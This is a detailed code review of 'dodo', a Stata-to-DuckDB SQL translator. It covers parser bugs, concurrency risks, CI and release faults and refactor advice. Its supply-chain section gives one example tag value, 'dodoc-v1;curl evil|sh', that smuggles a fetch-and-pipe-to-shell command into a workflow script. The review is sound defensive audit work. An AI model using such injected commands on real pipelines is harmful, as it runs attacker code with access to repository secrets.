# dodo codebase review — bugs, risks, and refactor recommendations

*Scope: full repository as of `b35126e` (2026-07-06). Core findings were verified empirically by
compiling `src/core/dodo_core.cpp` against a stub DTA reader (with ASan/UBSan) and driving
`ProcessLines` with crafted `.do` input; each such finding is marked **[confirmed]**.*

---

## 1. Executive summary

The core idea — compile `.do` commands to a lazy CTE chain — is sound and the code is readable.
The three biggest structural problems are:

1. **All parsing is done by ad-hoc string surgery** (`find`, `substr`, per-feature regexes) with
   no shared lexer. Quote-awareness, comment-awareness, and macro-awareness are each re-implemented
   (or forgotten) at every call site. This one design choice is the root cause of at least eight of
   the confirmed bugs below.
2. **Session state is a mutable global shared by every connection**, mutated at *parse* time, with
   no synchronization, and a stale duplicate of its struct definition sits on the include path.
3. **Stata's ordered-dataset semantics are mapped onto unordered SQL relations** without an
   explicit row-order column, so `sort`, `_n`, `tail`, and `duplicates drop` are nondeterministic
   by construction.

The CI/release pipeline has a show-stopper (`extension_name: waddle`) and a release workflow that
cannot compile, plus real supply-chain hardening gaps.

---

## 2. Confirmed bugs — core translator (`src/core/dodo_core.cpp`)

### 2.1 `//` comment stripping corrupts string literals **[confirmed]**
`ProcessLines` (`dodo_core.cpp:3867`) strips from the first `//` anywhere on the line, ignoring
quotes. `generate url = "http://example.com"` compiles to `SELECT *, ('http:) AS url ...` —
an unbalanced quote and silent data corruption. (Stata only treats `//` as a comment when preceded
by whitespace.) `AccumulateBraceBlock` (`dodo_core.cpp:3552`) has the same flaw, and also counts
`{`/`}` inside strings.

### 2.2 Macro expansion runs inside string literals **[confirmed]**
`ExpandMacros` (`dodo_core.cpp:618`) does not track quotes:
- `generate s = "paid in $USD today"` → `'paid in  today'` — `$USD` silently deleted.
- Undefined `` `name' `` and `${name}` references are deleted from string content the same way.
- Because `dodo_parser_override` macro-expands *every* line — including plain SQL lines in a mixed
  batch (`dodo_extension.cpp:177`) — ordinary SQL containing `$ident` or backticks can be corrupted
  before it reaches the parser.

### 2.3 Scalars silently shadow columns **[confirmed]**
The bare-scalar substitution pass (`dodo_core.cpp:748`) replaces any standalone identifier matching
a scalar name — including column references and text inside string literals. After
`scalar price = 5`, `generate double_price = price * 2` compiles to `(5 * 2)`, silently reading the
scalar instead of the `price` column. Stata's precedence is the opposite (variables win). This
produces wrong numbers with no error.

### 2.4 Missing-value comparison idiom silently no-ops **[confirmed]**
`.` translates to `NULL` (`dodo_core.cpp:1239`), so the very common idiom
`replace x = 0 if x >= .` becomes `CASE WHEN x >= NULL ...` — always NULL, never true; the command
does nothing, silently. All `.`-comparison idioms (`x < .`, `x == .`, `x != .`) are affected;
they need to translate to `IS NULL` / `IS NOT NULL`.

### 2.5 Nested multi-line loops generate garbage **[confirmed]**
```stata
foreach a in 1 2 {
  foreach b in 3 4 {
    generate v`a'`b' = `a'*`b'
  }
}
```
produces two steps `(1*) AS v1`, `(2*) AS v2` — the inner body is lost and the emitted SQL is
invalid. `execute_loop` (`dodo_core.cpp:3783`) only supports *single-line* nested loops; multi-line
nested bodies are silently mangled instead of raising an error.

### 2.6 `_n` / `_N` conflated at compile time **[confirmed]**
`FindRuntimeToken` (`dodo_core.cpp:216`) lowercases the expression, so `_n` (observation index) is
detected as `_N` (observation count), while `BuildSetVariableSQL` (`dodo_core.cpp:184`) only
substitutes uppercase `_N`. Result: `local i = _n + 1` emits `SET VARIABLE _dodo_l_i = _n + 1` —
invalid SQL — instead of either working or a clear diagnostic. These are different tokens in Stata.

### 2.7 `keep in` range syntax silently mistranslated **[confirmed]**
`keep in 1/10` is parsed as a column list: `SELECT "in", "1/10" FROM _s0`. Unsupported syntax
should raise, not compile to nonsense.

### 2.8 Empty assignment emits invalid SQL / UB **[confirmed]**
`local x =` emits `SET VARIABLE _dodo_l_x = ` (invalid SQL). The handler also calls
`value.front()` on a possibly empty string (`dodo_core.cpp:2104`, and the `global` twin at
`:2174`) — undefined behavior.

### 2.9 Raw `std::invalid_argument` escapes on malformed numbers **[confirmed]**
`undo abc` (`dodo_core.cpp:1723`), `forvalues i = a/b` (`ParseNumlist`, `:793-814`), `label define`
(`:1855`), and the `stod` calls in `TokenizeExpr` all throw unwrapped `stoi`/`stod` exceptions.
Through the plan path they surface to the user as the string `stoi`.

### 2.10 `display` expression tokenizer breaks on spaced operators **[confirmed]**
`display `x' + 1` (after expansion `display 1 + 1`) yields
`SELECT CAST(1 AS VARCHAR) || CAST(+ AS VARCHAR) || ...` — invalid SQL. Token accumulation in the
`display` handler (`dodo_core.cpp:2355`) splits bare expressions on whitespace.

### 2.11 Filenames are pasted into SQL literals unescaped **[confirmed]**
`FileReadFunction` (`dodo_core.cpp:986`), `save`, `export`, `import`, `merge ... using` all embed
the filename between single quotes with no escaping: `use "it's data.csv"` →
`read_csv('it's data.csv')` — broken SQL, and a general injection channel. The same missing
discipline shows up in `label list` (column names unescaped, `:1897`) and terminal-command
arguments (`head 5 OFFSET 2` pastes straight after `LIMIT`).

### 2.12 Order-dependence is nondeterministic by construction **[confirmed SQL, semantic]**
- `sort price` then `generate id = _n` emits `ROW_NUMBER() OVER ()` — an empty window over an
  unordered subquery. SQL does not guarantee that a CTE preserves the `ORDER BY` of the previous
  step; DuckDB may parallelize the scan and reorder rows.
- `bysort firm: generate n = _n` (no sort keys) → `ROW_NUMBER() OVER (PARTITION BY firm)` with no
  `ORDER BY` — nondeterministic within group.
- `tail` (`:3094`) and `duplicates drop varlist` (`:2998`) use the same unordered
  `ROW_NUMBER()` pattern.

Stata scripts lean heavily on `sort` + `_n`; this needs an explicit hidden order column (see §7).

### 2.13 `restore` after `undo` corrupts the chain
`restore` (`dodo_core.cpp:1708`) does `cte_steps.resize(preserve_checkpoint)`. If the user ran
`undo` past the checkpoint, `resize` *grows* the vector with empty strings, producing
`_s1 AS ()` — invalid SQL. `preserve`/`undo` interaction needs a guard.

### 2.14 Non-reentrant expression parser
The recursive-descent evaluator uses a file-scope `static idx_t expr_pos` (`dodo_core.cpp:352`).
Two threads evaluating expressions concurrently (plausible under DuckDB's parser hooks — see §3.1)
race on it.

### 2.15 Minor
- `IsSQLKeyword` (`string_utils.hpp:75`) is SQLite's keyword list, not DuckDB's (`qualify`,
  `semi`, `anti`, `asof` etc. missing).
- `summarize, detail` embeds the full CTE chain **three times** in one query (`:3196-3244`).
- `sort var, desc` accepted but Stata's actual syntax is `gsort`; harmless but undocumented.
- README badge says 0.1.1 while the project is at 0.3.0.

---

## 3. Architectural risks — extension layer (`src/extension/`)

### 3.1 One mutable global state, shared by all connections, mutated at parse time
- One `DodoStateInfo` per database instance is shared by every connection; `dodo_parser_override`
  and `dodo_plan` mutate `state.core` (CTE chain, macros, counters) with **no mutex**. Two
  connections issuing commands concurrently is a data race.
- `g_dodo_state` (`dodo_extension.cpp:14`) is a process-wide static: loading the extension into a
  second `DBConfig` repoints it, so the option callbacks (`dodo_live_view` etc.) mutate the *other*
  database's state. It also dangles after the first database is destroyed.
- State is mutated during **parsing**. A statement that is parsed but never successfully executed —
  binder error, failed `read_csv` (missing file), a prepared-but-never-run statement — still
  appends CTE steps. `use` even calls `state.Clear()` *before* knowing the file loads
  (`dodo_core.cpp:1626`): a typo'd filename destroys the current session.

### 3.2 Two divergent execution paths
Both `parse_function`/`plan_function` and `parser_override` are registered, and they behave
differently:
- `dodo_plan` (`dodo_extension.cpp:306`) never drains `state.pending_sql` (so `use`'s
  `CREATE TABLE dodo._current` would never execute on that path), binds only
  `parser.statements[0]` (dropping the rest of multi-statement results like `clear` cleanup),
  doesn't handle the `__PIVOT__` marker, and never refreshes the history table or live view.
- Which path fires depends on DuckDB's fallback rules, so command semantics differ by entry point.
  This is a correctness time bomb; one path should delegate to the other (§7).

### 3.3 Fragile string-marker protocols
- Results are filtered by substring: `sql.find("SELECT 'OK' AS status")` in three places
  (`dodo_core.cpp:1786`, `dodo_extension.cpp:202`, `dodoc.cpp:119`) and `sql.find("COPY (")` in
  `dodoc.cpp:124`. The dodoc variants demonstrably drop real output (§4).
- `reshape wide` communicates through a `"__PIVOT__:...||STATE||..."` string protocol
  (`dodo_core.cpp:3484`), handled only by the override path.
- `dodo_plan` uses `throw BinderException("dodo redirect to operator bind")` as control flow with a
  side-channel through `context.registered_state`. This is partly forced by DuckDB's extension API,
  but it deserves a comment block and a test pinning the behavior.

### 3.4 Naive statement splitting
`dodo_parser_override` splits the incoming query on `';'` (`dodo_extension.cpp:88`) and then on
newlines, ignoring quotes. A `;` or newline inside a string literal (in SQL or in a `.do` command)
splits the statement mid-literal.

### 3.5 Stale duplicated header — ODR landmine
`src/include/string_utils.hpp` and `src/include/dodo_extension.hpp` are one-line proxy headers,
but `src/include/dodo_core.hpp` is a **forked full copy** of `src/core/dodo_core.hpp`, last
synced 2026-05-27 and now missing `SymbolEntry`, the symbol tables, `pending_sql`, tempvar
tracking, etc. DuckDB's extension build puts `src/include` on the include path (that's why the
proxies exist). Any translation unit that resolves `dodo_core.hpp` to the stale copy compiles a
`DodoState` with a different layout than `dodo_core.cpp` — an ODR violation that manifests as
silent memory corruption, not a compile error. Replace it with a proxy header today.

---

## 4. Bugs — CLI, build, CI

### 4.1 `dodoc` output filtering drops real SQL
- `clear` returns `DROP TABLE ...; DROP SCHEMA ...; SELECT 'OK' AS status` as one string; the
  substring filter (`dodoc.cpp:119`) discards the whole thing, so compiled scripts never emit the
  cleanup DDL.
- Any mid-script `save`/`export` sets `has_terminal_side_effect` (`dodoc.cpp:124`), which then
  suppresses the final chain query — `use a.csv / save backup.csv / keep if ...` loses the user's
  actual result query.
- `DODOC_VERSION` is hardcoded `"0.3.0"` (`dodoc.cpp:9`) while releases are cut from git tags;
  they will drift.

### 4.2 CI is packaging the wrong extension name
`.github/workflows/MainDistributionPipeline.yml:21,29` sets `extension_name: waddle` (template
leftover). The distribution/test jobs look for `waddle.duckdb_extension`; the build produces
`dodo.duckdb_extension`. The main pipeline cannot be testing or shipping what you think it is.

### 4.3 The dodoc release workflow cannot compile
`dodoc-release.yml` checks out without submodules, passes only `-Isrc/core`, and doesn't compile
`duckdb-dta/src/dta_reader.cpp` — but `dodo_core.cpp:2` includes `dta_reader.hpp` and uses
`dta::DtaReader`. Every matrix job fails at compile. There are **three** independent build
definitions for dodoc (CMakeLists, Makefile, raw compiler lines in the workflow) and they have
already drifted; the workflow should just call `make dodoc`.

### 4.4 Supply-chain / workflow hardening
- `dodoc-release.yml:135,157,196,207` interpolates the tag name directly into `run:` scripts — a
  tag like `dodoc-v1;curl evil|sh` executes arbitrary shell in a job with `contents: write` and
  `secrets.TAP_TOKEN`. Pass it via `env:` instead.
- Third-party actions pinned by mutable tag (`softprops/action-gh-release@v2`,
  `ilammy/msvc-dev-cmd@v1`) in a workflow holding a cross-repo PAT; pin to SHAs.
- `scripts/extension-upload.sh:47-50` writes the signing key to `private.pem`; under `set -e` a
  failure between write and `rm` leaves the key in the workspace. Use a `trap` or stdin.
- The cross-compiled `dodoc-macos-x86_64` binary is never smoke-tested before Homebrew pins a SHA
  to it.
- `ExtensionTemplate.yml` is dead template code using deprecated actions; delete it.
- `scripts/extension-upload.sh` is referenced by nothing — dead code or a missing deploy job.

### 4.5 Makefile
- The per-version rule `git checkout`s the shared `duckdb/` submodule and restores it via
  `git describe --tags`, which yields `1.5.2-N-gHASH` on non-tag commits — the restore fails and
  later builds silently use the wrong DuckDB. `make -j e2e` races two checkouts of the same
  submodule.
- `e2e-python` pins pip `duckdb==1.5.2` but loads the default `build/release` extension built
  against whatever the submodule points to — version-mismatch `LOAD` failures.
- `add_executable(dodoc ...)` inside the extension CMakeLists means every distribution target
  (mingw, wasm) also tries to build the native CLI; gate it (`if(NOT EMSCRIPTEN)`) or move it out.

---

## 5. Bugs — Python tooling (`rhistory-corpus/`, `scripts/bootstrap-template.py`)

- `find_rhistory.py:43-49` — rate-limit handling is dead code: callers lowercase header keys but
  `_handle_rate_limit` looks up mixed-case names, so the sleep never fires; on 403 the loop
  tight-retries and burns all retries in seconds (reliably fatal without a token).
- `find_rhistory.py:242` — output opened in append mode with an in-memory-only dedup set: re-runs
  append duplicates. `find_rhistory.py:279` — no filename length cap → `ENAMETOOLONG` aborts the
  whole run on one deep repo path.
- `parse_rhistory.py:268` — `x <<- 5` splits on `<-` first, recording target `"x <"`.
- `parse_rhistory.py:203-229` — function extraction is quote-unaware: `grepl("size(", x)` records a
  phantom `size` call, systematically inflating corpus counts.
- `parse_rhistory.py:132-146` — one unclosed `(` early in a large `.Rhistory` makes continuation
  joining O(n²) and merges the rest of the file into one garbage record.
- `bootstrap-template.py:76` — the `__REPLACEMENT_DONE__` placeholder is appended *after* the
  line's `\n`, so it protects the wrong line; combined with `MainDistributionPipeline.yml` being
  processed twice, names containing the template word get double-substituted
  (`waddle_tools` → `waddle_tools_tools`). The script is also destructive, non-atomic,
  cwd-relative, and not re-runnable.
- `tests/test_decode.py` tests only the stdlib, not project code — false confidence.

---

## 6. Performance

1. **History table and live view are rebuilt from scratch after every command**
   (`BuildHistorySQL`/`BuildLiveViewSQL`, `dodo_extension.cpp:20-66`, injected at `:254-273`):
   `CREATE OR REPLACE TABLE dodo._history AS VALUES (...)` re-materializes the entire history —
   O(n) DDL per step, O(n²) per session, one extra write transaction per command. Make history an
   `INSERT` into a persistent table and the view refresh optional.
2. **`std::regex` objects are constructed on every `TranslateExpression` call** (~10 regex compiles
   per expression, `dodo_core.cpp:1198-1502`). For a 10k-line do-file that's ~100k regex compiles.
   Hoist them to `static const`.
3. **`ExpandMacros` is O(depth × scalars × line length)**: the fixpoint loop rescans the whole line
   up to 50 times, and the scalar-substitution pass scans once per scalar per iteration
   (`dodo_core.cpp:623-768`).
4. **The CTE chain grows without bound**: every inspection command re-plans the entire chain, and
   `summarize, detail` inlines it three times. Long interactive sessions produce multi-megabyte
   query strings. Consider periodic auto-checkpointing (materialize + truncate chain), which the
   `dodo._current` machinery already half-supports.
5. `BuildQuery`/`BuildCTEPrefix` rebuild the full string per command — fine today, but combined
   with (4) it's quadratic in session length.

---

## 7. Refactor recommendations (prioritized)

### P0 — correctness landmines (small, do immediately)
1. **Replace `src/include/dodo_core.hpp` with a proxy header** like its two siblings (§3.5).
2. **Fix `extension_name: waddle`** in `MainDistributionPipeline.yml`; make `dodoc-release.yml`
   call `make dodoc` with submodules checked out (§4.2–4.3).
3. **Escape every user string entering SQL** — add `SqlString(const string&)` next to `QuoteIdent`
   in `string_utils.hpp` and use it for filenames, labels, history text (§2.11).
4. Wrap all `stoi`/`stod` in checked helpers that throw `DodoException` with the offending text
   (§2.9); guard `restore`-after-`undo` (§2.13); fix `value.front()` on empty (§2.8); make
   `expr_pos` a parameter (§2.14); translate `.`-comparisons to `IS [NOT] NULL` (§2.4); make
   unsupported syntax (`keep in`, nested multi-line loops) raise instead of mistranslate
   (§2.5, §2.7).

### P1 — one lexer to rule out a bug class
Build a single quote/comment/brace-aware tokenizer for `.do` lines and route *everything* through
it: comment stripping, statement splitting, macro expansion, `if` detection, option splitting,
brace accumulation, `SplitTokens`. Today each of these re-implements quote handling (or doesn't),
which is the direct cause of §2.1, §2.2, §2.3 (string-literal half), §3.4, and the brace-counting
flaw. This is the highest-leverage change in the codebase: roughly a week of work that
retires an entire class of bugs and makes every future command cheaper to add. Macro expansion
should operate on tokens (skipping string literals, with Stata's variable-over-scalar precedence)
rather than raw text.

### P2 — state and execution model
1. **Kill the global.** Store `DodoState` per `ClientContext` (via `registered_state`, as
   `DodoBindState` already does) or guard the shared state with a mutex; derive option-callback
   state from the callback's `ClientContext` instead of `g_dodo_state`.
2. **One execution path.** Make `dodo_plan` delegate to the same code the override uses (drain
   `pending_sql`, handle `__PIVOT__`, multi-statement results, history/live-view), or drop the
   parse/plan path entirely if the override is always reachable.
3. **Transactional state updates.** Stage mutations in a copy (or record an undo closure) and
   commit only after the generated SQL binds/executes; at minimum, stop `use` from clearing state
   before the source is known to load (§3.1).
4. Replace the `SELECT 'OK'`/`COPY (`/`__PIVOT__` substring protocols with a small typed result
   struct: `{ vector<Statement> side_effects; optional<Statement> result; bool is_ok_marker; }`.

### P3 — command architecture
`ProcessCommand` is a ~2,000-line `if` chain, and command metadata lives in three lists that must
be kept in sync by hand (`DODO_COMMANDS`, `IsTransformationCommand`, and the keyword checks inside
`dodo_parser_override`). Restructure as a registry:

```cpp
struct CommandDef {
    string name;
    CommandKind kind;              // transformation / terminal / side-effect / macro
    bool conflicts_with_sql;       // drives parser_override detection
    CommandResult (*handler)(const DodoCommand&, DodoState&);
};
```

One table, one dispatch, and the extension derives its keyword checks from the same table. Split
handlers into a few files (`cmd_data.cpp`, `cmd_macros.cpp`, `cmd_stats.cpp`, ...) — 4,000-line
translation units are where drift like §2.6 hides.

### P4 — deterministic ordering
Thread a hidden `_dodo_order BIGINT` column through the chain: `use` initializes it
(`row_number() over ()` at materialization time), `sort` reassigns it, and every `_n`, `tail`,
`duplicates drop`, and bysort window gets `ORDER BY _dodo_order` by default. Strip it in terminal
SELECTs. This is the only way to honor Stata's ordered-dataset model on SQL (§2.12) and it also
makes `bysort` without sort keys reproducible.

### P5 — tests and CI
1. The core is now DuckDB-independent — exploit that: add a **golden-SQL unit suite** (feed `.do`
   text to `ProcessLines`, snapshot emitted SQL) that runs in seconds on every push. The repro
   harness used for this review is a ready-made skeleton.
2. Wire `make e2e` (and `test_dodoc.sh`, currently orphaned) into CI; today no workflow runs any
   e2e suite.
3. Replace whole-output substring assertions in `test/e2e/test_cli.sh` with exact per-case
   checks and stop masking exit codes with `|| true`.
4. Add negative tests (5 `statement error` blocks across ~4,500 test lines today) and make
   `test/sql/dodo_io.test` write to `__TEST_DIR__` instead of `test/data/`.

### P6 — performance
Incremental history inserts, hoisted static regexes, and chain auto-checkpointing (§6). None are
urgent; all are straightforward after P2/P3.

---

## 8. What's good

Worth preserving through any refactor: the clean core/extension split (the core really is
DuckDB-free, which made this review's compile-and-drive verification trivial); the lazy CTE-chain
design itself, which composes naturally with undo/redo/preserve; `str::QuoteIdent`'s conservative
quoting; the breadth of the SQL logic tests (`test/sql/`, ~4,500 lines); and the honest
compile-time-vs-runtime split for macros (`SymbolKind::LITERAL` vs `VARIABLE` with
`SET VARIABLE`/`getvariable`), which is a genuinely nice solution to a hard problem.
